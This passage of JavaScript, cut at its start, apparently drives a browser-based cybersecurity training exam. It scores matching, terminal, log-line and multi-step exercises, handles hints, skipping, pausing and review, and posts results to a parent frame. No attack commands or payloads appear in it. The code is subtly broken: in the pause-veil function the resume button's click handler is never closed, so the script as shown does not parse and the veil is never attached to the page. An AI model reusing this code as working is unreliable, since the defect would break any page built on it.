        var a = (wstate.assign || {})[li];
        if (a === undefined) item('mi', '○ Missed: "' + strip(p.left) + '" → ' + esc(p.right));
        else if (a === li) { H++; item('ok', '✓ "' + strip(p.left) + '" → ' + esc(p.right)); }
        else { W++; item('no', '✗ "' + strip(p.left) + '" you matched to "' + strip(ex.pairs[a].right) + '", expected "' + esc(p.right) + '"'); }
      });
      canon = ex.pairs.map(function (p) { return strip(p.left) + ' = ' + strip(p.right); }).join(' | ');
    } else if (ex.type === 'terminal') {
      N = ex.elements.length;
      var cmd = norm(wstate.cmd || '');
      ex.elements.forEach(function (el2) {
        var hit = (el2.any || []).some(function (a) { return cmd.indexOf(String(a).toLowerCase()) >= 0; });
        if (hit) { H++; item('ok', '✓ ' + esc(el2.label)); }
        else { item('mi', '○ Missing: ' + esc(el2.label)); }
      });
      if (!cmd) item('mi', '○ Nothing typed — expected: ' + esc(ex.expected));
      canon = ex.expected;
    } else if (ex.type === 'line-select') {
      N = ex.badLines.length;
      var sel2 = wstate.sel || [];
      ex.badLines.forEach(function (li) {
        if (sel2.indexOf(li) >= 0) { H++; item('ok', '✓ Line ' + (li + 1) + ' is indeed the one to flag'); }
        else { item('mi', '○ Missed line ' + (li + 1) + ': ' + esc(shorten(ex.logLines[li], 90))); }
      });
      sel2.forEach(function (li) {
        if (ex.badLines.indexOf(li) < 0) { W++; item('no', '✗ Line ' + (li + 1) + ' is benign: ' + esc(shorten(ex.logLines[li], 80))); }
      });
      canon = ex.badLines.map(function (li) { return 'line ' + (li + 1); }).join(', ');
    } else if (ex.type === 'multi-step') {
      N = ex.steps.length;
      ex.steps.forEach(function (st, si) {
        var p = (wstate.picks || {})[si];
        if (p === undefined) item('mi', '○ Missed step ' + (si + 1) + ' — expected: ' + strip(st.options[st.correct]));
        else if (p === st.correct) { H++; item('ok', '✓ Step ' + (si + 1) + ': ' + strip(st.options[st.correct])); }
        else { W++; item('no', '✗ Step ' + (si + 1) + ' — you chose "' + strip(st.options[p]) + '", expected "' + strip(st.options[st.correct]) + '"'); }
      });
      canon = ex.steps.map(function (st, si) { return (si + 1) + '. ' + strip(st.options[st.correct]); }).join(' ');
    }
    var credit = N > 0 ? Math.max(0, (H - W) / N) : 0;
    if (N === 1) credit = H === 1 ? 1 : 0; /* single-answer: binary */
    if (S.answers[S.current].hintUsed) credit = Math.max(0, credit - 0.10);
    credit = Math.round(credit * 100) / 100;
    return { credit: credit, items: items, N: N, H: H, W: W, canon: canon };
  }
  function strip(s) { return esc(String(s).replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim()); }
  function shorten(s, n) { s = String(s); return s.length > n ? s.slice(0, n - 1) + '…' : s; }
  function slotLabelFor(ex, bi) { var lbl = ''; ex.slots.forEach(function (sl) { if (sl.accept.indexOf(bi) >= 0) lbl = sl.label; }); return lbl; }

  /* ---------------- exercise screen ---------------- */
  function renderExercise(i) {
    var ex = EXERCISES[i];
    S.current = i;
    var a = S.answers[i];
    var area = $('exerciseArea'); area.innerHTML = '';
    $('tbTitle').textContent = META.title;
    $('tbSevWord').textContent = META.severityLabel;
    $('progressBar').style.width = Math.round(((i + 1) / EXERCISES.length) * 100) + '%';
    var tpEl = $('tbPart'); if (tpEl) { tpEl.textContent = 'Exercise ' + (i + 1) + ' of ' + EXERCISES.length; }

    var card = el('div', 'card');
    /* SCENARIO */
    var sc = el('div', 'block blk-scenario');
    var longSc = ex.scenario.length > 380;
    sc.innerHTML = '<div class="block-h"><span aria-hidden="true">📄</span> SCENARIO' + (longSc ? '<button type="button" class="sc-toggle" aria-expanded="true">⇅ collapse</button>' : '') + '</div>' +
      '<div class="block-b" id="scBody">' + ex.scenario + (ex.artifactNote ? '<div class="dd-hint">' + esc(ex.artifactNote) + '</div>' : '') + '</div>';
    card.appendChild(sc);
    if (longSc) {
      var tbtn = sc.querySelector('.sc-toggle'), body = sc.querySelector('#scBody');
      tbtn.addEventListener('click', function () {
        var open = tbtn.getAttribute('aria-expanded') === 'true';
        tbtn.setAttribute('aria-expanded', String(!open));
        tbtn.textContent = open ? '⇅ expand' : '⇅ collapse';
        body.classList.toggle('hidden', open);
      });
    }
    /* QUESTION */
    card.appendChild(el('div', 'block blk-question',
      '<div class="block-h"><span aria-hidden="true">❓</span> QUESTION</div><div class="block-b">' + ex.question + '</div>'));
    /* YOUR ANSWER */
    var answ = el('div', 'block blk-answer', '<div class="block-h"><span aria-hidden="true">✍</span> YOUR ANSWER</div>');
    var abody = el('div', 'block-b'); answ.appendChild(abody); card.appendChild(answ);

    var wstate = a.wstate;
    widgetFor(ex, abody, wstate);

    /* action row */
    var actions = el('div', 'actions');
    var checkBtn = el('button', 'btn btn-primary', '✓ Check');
    checkBtn.type = 'button'; checkBtn.id = 'checkBtn'; checkBtn.setAttribute('aria-label', 'Check your answer');
    checkBtn.addEventListener('click', doCheck);
    var nextBtn = el('button', 'btn btn-blue hidden', (i === EXERCISES.length - 1 || S.reviewMode) ? (S.reviewMode ? '⏭ Back to review' : '⏭ Final submit') : '⏭ Next');
    nextBtn.type = 'button'; nextBtn.id = 'nextBtn';
    nextBtn.addEventListener('click', goNext);
    var hintBtn = el('button', 'btn btn-amber', '💡 Hint (−10%)');
    hintBtn.type = 'button'; hintBtn.setAttribute('aria-label', 'Show hint, costs 10 percent of this exercise credit');
    hintBtn.disabled = a.hintUsed || a.status === 'checked';
    hintBtn.addEventListener('click', function () {
      if (a.hintUsed || a.status === 'checked') return;
      a.hintUsed = true; hintBtn.disabled = true;
      var hb = el('div', 'hintbox', '<div class="hb-h">💡 Hint — this exercise\'s credit is now reduced by 10%</div>' + esc(ex.hint));
      card.insertBefore(hb, actions);
    });
    var skipBtn = el('button', 'btn btn-ghost', '⚠ Skip');
    skipBtn.type = 'button'; skipBtn.setAttribute('aria-label', 'Skip this exercise'); skipBtn.disabled = a.status === 'checked';
    skipBtn.addEventListener('click', doSkip);
    actions.appendChild(checkBtn); actions.appendChild(nextBtn); actions.appendChild(el('span', 'spacer'));
    actions.appendChild(hintBtn); actions.appendChild(skipBtn);
    card.appendChild(actions);
    area.appendChild(card);

    /* manual pause veil (hidden by default) */
    if (S.timerState === 'PAUSED_MANUAL') showPauseVeil();

    /* restore feedback if already checked (should not normally happen) */
    if (a.status === 'checked') { renderFeedback(card, ex, a, true); checkBtn.disabled = true; nextBtn.classList.remove('hidden'); }

    updateScoreBar();
    /* pause button lives in topbar */
    renderTopbarButtons();
  }
  function renderTopbarButtons() {
    var bar = $('topbar');
    var old = document.getElementById('pauseBtn');
    if (old) old.remove();
    if (S.screen !== 'exam') return;
    var b = el('button', 'btn btn-ghost', '⏸ Pause');
    b.type = 'button'; b.id = 'pauseBtn'; b.setAttribute('aria-label', 'Pause the exam (manual pause)');
    b.addEventListener('click', function () {
      if (S.timerState === 'RUNNING' || S.timerState === 'PAUSED_AUTO_CHECK') {
        S.priorState = S.timerState;
        setTimerState('PAUSED_MANUAL'); showPauseVeil();
      } else if (S.timerState === 'PAUSED_MANUAL') {
        hidePauseVeil(); setTimerState(S.priorState || 'RUNNING');
      }
    });
    bar.appendChild(b);
    var oldF = document.getElementById('finishBtn');
    if (oldF) oldF.remove();
    var f = el('button', 'btn btn-ghost', '⏹ Finish');
    f.type = 'button'; f.id = 'finishBtn'; f.setAttribute('aria-label', 'Finish the exam early');
    f.addEventListener('click', function () { finishExam(false); });
    bar.appendChild(f);
  }
  function showPauseVeil() {
    var stage = document.querySelector('.exam-stage');
    var old = stage.querySelector('.pause-veil'); if (old) old.remove();
    var veil = el('div', 'pause-veil',
      '<div class="pv-ic" aria-hidden="true">⏸</div><div class="pv-word">PAUSED — manual</div>' +
      '<div style="color:var(--text-secondary);max-width:420px">The exercise is hidden while you are on a break. The timer is stopped.</div>');
    var r = el('button', 'btn btn-primary', '▶ Resume');
    r.type = 'button'; r.setAttribute('aria-label', 'Resume the exam');
    r.addEventListener('click', function () {
      hidePauseVeil();
      setTimerState(S.priorState === 'PAUSED_AUTO_CHECK' ? 'PAUSED_AUTO_CHECK' : 'RUNNING');

    veil.appendChild(r);

    $('exerciseArea').querySelector('.card').style.visibility = 'hidden';
  }
  function hidePauseVeil() {
    var v = document.querySelector('.pause-veil'); if (v) v.remove();
    var c = $('exerciseArea').querySelector('.card'); if (c) c.style.visibility = 'visible';
  }

  function doCheck() {
    var i = S.current, ex = EXERCISES[i], a = S.answers[i];
    if (a.status === 'checked') return;
    var res = scoreExercise(ex, a.wstate);
    a.status = 'checked';
    a.credit = res.credit;
    a.result = res;
    a.label = res.credit >= 1 ? 'correct' : (res.credit > 0 ? 'partial' : 'incorrect');
    setTimerState('PAUSED_AUTO_CHECK'); /* check-triggered auto-pause */
    var card = $('exerciseArea').querySelector('.card');
    renderFeedback(card, ex, a, false);
    var cb = document.getElementById('checkBtn'); if (cb) cb.disabled = true;
    var sb = document.querySelector('#exerciseArea .btn-ghost'); /* skip button */ if (sb) sb.disabled = true;
    var hb = document.querySelector('#exerciseArea .btn-amber'); if (hb) hb.disabled = true;
    var nb = document.getElementById('nextBtn'); if (nb) nb.classList.remove('hidden');
    lockWidgets(card);
    updateScoreBar();
  }
  function lockWidgets(card) {
    var abody = card.querySelector('.blk-answer');
    if (!abody) return;
    abody.querySelectorAll('button, input').forEach(function (x) {
      x.disabled = true; x.style.pointerEvents = 'none'; x.readOnly = true;
      if (x.classList.contains('chip')) x.draggable = false;
    });
  }
  function renderFeedback(card, ex, a, restoring) {
    var old = card.querySelector('.fb'); if (old) old.remove();
    var res = a.result;
    var cls = a.label === 'correct' ? 'fb-correct' : (a.label === 'partial' ? 'fb-partial' : 'fb-incorrect');
    var word = a.label === 'correct' ? '✓ CORRECT' : (a.label === 'partial' ? '✓ PARTIALLY CORRECT' : '✗ INCORRECT');
    var fb = el('div', 'fb ' + cls);
    var hh = '<span>' + word + '</span>';
    if (res.N > 1) hh += '<span class="fb-credit">credit ' + res.credit.toFixed(2) + ' — ' + res.H + '/' + res.N + ' items</span>';
    else hh += '<span class="fb-credit">credit ' + res.credit.toFixed(2) + '</span>';
    if (a.hintUsed) hh += '<span class="fb-credit">💡 hint −0.10 applied</span>';
    fb.appendChild(el('div', 'fb-h', hh));
    var it = el('div', 'fb-items');
    res.items.forEach(function (im) { it.appendChild(el('div', 'fb-item ' + im.state, '<span class="fi-ic">' + (im.state === 'ok' ? '✓' : im.state === 'no' ? '✗' : '○') + '</span><span>' + im.label + '</span>')); });
    fb.appendChild(it);
    if (res.canon) {
      var c = el('div', 'canon');
      c.appendChild(el('div', 'dd-hint', 'Correct answer:'));
      c.appendChild(el('pre', 'art', esc(res.canon)));
      fb.appendChild(c);
    }
    fb.appendChild(el('div', 'exp', ex.explanation));
    if (a.label !== 'correct' && ex.study) fb.appendChild(el('div', 'study', '📚 What to study: ' + esc(ex.study)));
    var acts = card.querySelector('.actions');
    card.insertBefore(fb, acts);
    fb.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  function doSkip() {
    var i = S.current, a = S.answers[i];
    if (a.status === 'checked') return;
    a.status = 'skipped';
    if (S.skipped.indexOf(i) < 0) S.skipped.push(i);
    /* no auto-pause: timer keeps running */
    advance();
  }
  function goNext() {
    if (S.timerState === 'PAUSED_AUTO_CHECK') setTimerState('RUNNING'); /* resume on Next */
    if (S.reviewMode) { S.reviewMode = false; renderReview(); showScreen('review'); return; }
    advance();
  }
  function advance() {
    var nxt = -1;
    for (var j = S.current + 1; j < EXERCISES.length; j++) { if (S.answers[j].status === 'unanswered') { nxt = j; break; } }
    if (nxt < 0) { /* none forward: go to review or results */
      for (var k = 0; k < EXERCISES.length; k++) { if (S.answers[k].status === 'unanswered') { nxt = k; break; } }
    }
    if (nxt >= 0) renderExercise(nxt);
    else finishExam(false);
  }

  /* ---------------- review-skipped screen ---------------- */
  function renderReview() {
    var root = $('screen-review'); root.innerHTML = '';
    var c = el('div', 'card');
    c.appendChild(el('h2', null, '⚠ Review skipped exercises'));
    var open = S.skipped.filter(function (i) { return S.answers[i].status === 'skipped'; });
    if (open.length === 0) {
      c.appendChild(el('p', null, 'No skipped exercises left — everything was answered.'));
    } else {
      c.appendChild(el('p', 'dd-hint', 'You can return to any skipped exercise and answer it while the timer has not ended. Skipped-and-never-answered exercises are excluded from your score.'));
      open.forEach(function (i) {
        var row = el('div', 'rev-item');
        row.appendChild(el('span', 'ri-id', esc(EXERCISES[i].id)));
        row.appendChild(el('span', 'ri-sum', esc(EXERCISES[i].summary)));
        var b = el('button', 'btn btn-blue', '↩ Return to it');
        b.type = 'button'; b.setAttribute('aria-label', 'Return to ' + EXERCISES[i].id);
        b.addEventListener('click', function () { S.reviewMode = true; S.reviewFrom = 'review'; showScreen('exam'); renderExercise(i); });
        row.appendChild(b);
        c.appendChild(row);
      });
    }
    var acts = el('div', 'actions');
    var back = el('button', 'btn btn-ghost', '← Keep working (unanswered exercises)');
    back.type = 'button';
    back.addEventListener('click', function () {
      var u = -1; for (var k = 0; k < EXERCISES.length; k++) { if (S.answers[k].status === 'unanswered' && S.skipped.indexOf(k) < 0) { u = k; break; } }
      if (u < 0) u = -1;
      if (u >= 0) { showScreen('exam'); renderExercise(u); } else { finishExam(false); }
    });
    var fin = el('button', 'btn btn-primary', '⏹ Final submit');
    fin.type = 'button'; fin.setAttribute('aria-label', 'Final submit and show results');
    fin.addEventListener('click', function () { finishExam(false); });
    acts.appendChild(back); acts.appendChild(el('span', 'spacer')); acts.appendChild(fin);
    c.appendChild(acts);
    root.appendChild(c);
  }

  /* ---------------- results ---------------- */
  function finishExam(timeout) {
    var anySkippedOpen = S.skipped.some(function (i) { return S.answers[i].status === 'skipped'; });
    if (!timeout && anySkippedOpen && S.timerState !== 'ENDED' && S.screen !== 'review') { renderReview(); showScreen('review'); return; }
    setTimerState('ENDED');
    var r = creditSum();
    var answered = r.n;
    var percent = answered > 0 ? Math.round((r.sum / answered) * 100) : 0;
    var passed = percent >= (META.passMark || 70);
    /* counts */
    var full = 0, part = 0, zero = 0, skipped = 0, partSum = 0;
    EXERCISES.forEach(function (ex, i) {
      var st = S.answers[i].status;
      if (st === 'checked') {
        var cr = S.answers[i].credit;
        if (cr >= 1) full++;
        else if (cr > 0) { part++; partSum += cr; }
        else zero++;
      } else if (st === 'skipped') skipped++;
      else skipped++; /* unanswered at submit = excluded */
    });
    var root = $('screen-results'); root.innerHTML = '';
    var hero = el('div', 'card');
    var verdictTxt = passed ? '✓ PASS' : '✗ FAIL';
    hero.appendChild(el('div', 'res-hero',
      '<div><div class="res-score">' + percent + '%<small> · ' + r.sum.toFixed(1) + ' / ' + answered + ' credits</small></div>' +
      '<div class="dd-hint">scored over answered exercises only — skipped and never-answered are excluded</div></div>' +
      '<div class="verdict ' + (passed ? 'pass' : 'fail') + '">' + verdictTxt + '</div>'));
    root.appendChild(hero);
    var grid = el('div', 'res-grid');
    function cell(n, l, cls, ic) { return '<div class="res-cell"><div class="rc-n ' + (cls || '') + '">' + n + '</div><div class="rc-l"><span>' + ic + '</span><span>' + l + '</span></div></div>'; }
    grid.innerHTML =
      cell(full, 'Fully correct', 'ok-c', '✓') +
      cell(part + (part > 0 ? ' <small style="font-size:.8rem;color:var(--text-secondary)">(avg ' + (partSum / part).toFixed(2) + ')</small>' : ''), 'Partially correct', 'no-c', '✓') +
      cell(zero, 'Fully incorrect', 'no-c', '✗') +
      cell(skipped, 'Skipped — excluded', 'mi-c', '⚠');
    var gcard = el('div', 'card'); gcard.appendChild(grid);
    gcard.appendChild(el('div', 'dd-hint', '⏸ Time paused manually: ' + fmtTime(Math.round(S.manualPauseMs / 1000)) + ' · ⏸ Time reviewing feedback (auto-pause): ' + fmtTime(Math.round(S.autoPauseMs / 1000)) + ' · ⏱ Time used: ' + fmtTime((META.estimatedMinutes * 60) - S.remaining) + (timeout ? ' (timer ran out)' : '')));
    /* per-exercise strip */
    var strip = el('div', 'strip');
    EXERCISES.forEach(function (ex, i) {
      var st = S.answers[i].status, cr = S.answers[i].credit;
      var cls = st === 'checked' ? (cr >= 1 ? 'st-ok' : cr > 0 ? 'st-pa' : 'st-no') : 'st-sk';
      var ic = st === 'checked' ? (cr >= 1 ? '✓' : cr > 0 ? '±' : '✗') : '⚠';
      var chip = el('span', 'st-chip ' + cls, ic);
      chip.title = ex.id + (st === 'checked' ? ' — credit ' + cr.toFixed(2) : ' — skipped/excluded');
      chip.setAttribute('aria-label', chip.title);
      strip.appendChild(chip);
    });
    gcard.appendChild(strip);
    root.appendChild(gcard);
    var acts = el('div', 'actions');
    var rt = el('button', 'btn btn-primary', '↺ Retake the exam');
    rt.type = 'button'; rt.setAttribute('aria-label', 'Retake the exam');
    rt.addEventListener('click', retake);
    acts.appendChild(rt);
    root.appendChild(el('div', 'card', '')).appendChild(acts);
    showScreen('results');
    /* report exactly once per attempt */
    if (!S.reported) {
      S.reported = true;
      reportScore(r.sum, answered);
    }
  }
  function retake() {
    S.answers = EXERCISES.map(function () { return { status: 'unanswered', credit: 0, hintUsed: false, wstate: {}, result: null, label: '' }; });
    S.skipped = []; S.current = 0; S.reviewMode = false; S.reported = false; S.attempt++;
    S.manualPauseMs = 0; S.autoPauseMs = 0; S.priorState = null;
    buildShuffles();
    setTimerState('RUNNING'); S.remaining = (META.estimatedMinutes || 15) * 60;
    showScreen('exam'); renderExercise(0);
  }
  function reportScore(creditSumV, answeredCount) {
    var percent = answeredCount > 0 ? Math.round((creditSumV / answeredCount) * 100) : 0;
    try {
      parent.postMessage({
        type: 'CYBERPULSE_SCORE',
        topicId: META.topicId,
        batch: META.batch,
        score: Math.round(creditSumV),
        total: answeredCount,
        percent: percent,
        passed: percent >= 70
      }, location.origin);
    } catch (e) { /* opened directly rather than inside the site — nothing to report to */ }
  }

  /* ---------------- handshake ---------------- */
  window.addEventListener('message', function (event) {
    if (!event.data) return;
    var type = event.data.type;
    if (type !== 'CYBERPULSE_INIT' && type !== 'CYBERMASTERY_INIT') return;
    try {
      if (event.data.username) {
        var c = $('tbCandidate');
        c.textContent = '👤 ' + String(event.data.username).slice(0, 24);
        c.classList.remove('hidden');
      }
      /* country, locale, topicId, batch are consumed; theme is always 'dark' — this file is dark-only by contract */
    } catch (e) { }
  });

  /* ---------------- boot ---------------- */
  function boot() {
    S.answers = EXERCISES.map(function () { return { status: 'unanswered', credit: 0, hintUsed: false, wstate: {}, result: null, label: '' }; });
    buildShuffles();
    $('tbTitle').textContent = META.title;
    $('tbSevWord').textContent = META.severityLabel;
    renderIntro();
    showScreen('intro');
  }
  window.__CP_BOOT__ = boot;
})();

window.__CP_BOOT__();
</script>
